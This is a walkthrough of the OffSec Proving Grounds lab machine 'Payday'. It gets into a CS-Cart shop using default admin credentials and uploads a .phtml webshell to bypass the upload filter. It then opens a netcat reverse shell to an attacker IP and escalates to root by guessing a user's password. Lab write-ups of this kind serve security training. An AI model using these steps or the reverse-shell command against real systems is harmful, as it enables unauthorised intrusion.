# Payday — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

CS-Cart shopping cart with default admin creds → authenticated RCE via template editor PHP upload → shell as www-data → `su patrick:patrick` → full sudo → root.

---

## Enumeration

```bash
nmap -sV -p- 192.168.177.39
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 4.6p1 |
| 80 | HTTP | Apache 2.2.4 (CS-Cart) |
| 110 | POP3 | Dovecot |
| 139/445 | SMB | Samba 3.0.26a |
| 143 | IMAP | Dovecot |
| 993 | IMAPS | Dovecot |
| 995 | POP3S | Dovecot |

Port 80 is running **CS-Cart** — "Powerful PHP shopping cart software". Gobuster finds it: `/admin.php` with default creds `admin:admin`.

---

## Exploitation — CS-Cart Authenticated RCE

Using the exploit from [EDB-48891](https://www.exploit-db.com/exploits/48891), we can upload a PHP webshell via the template editor:

1. Log in at `http://192.168.177.39/admin.php` with `admin:admin`
2. Navigate to the template editor: `admin.php?target=template_editor`
3. Upload a PHP reverse shell with `.phtml` extension
4. Access it at `http://192.168.177.39/skins/<shell>.phtml`

```bash
nc 192.168.45.201 4444 -e /bin/sh
```

Shell as `www-data`. Upgrade it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation — Password Guessing

The user `patrick` has a very... creative password:

```bash
su patrick
# Password: patrick
```

Checking sudo:

```bash
sudo -l
# (ALL : ALL) ALL
```

```bash
sudo su
```

**Root.** 🎉

---

## Key Takeaways

- **CS-Cart template editor** allows PHP file uploads — instant RCE when you have admin access
- Sometimes priv esc is as simple as guessing obvious passwords
- The `.phtml` extension can bypass upload filters that block `.php`

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
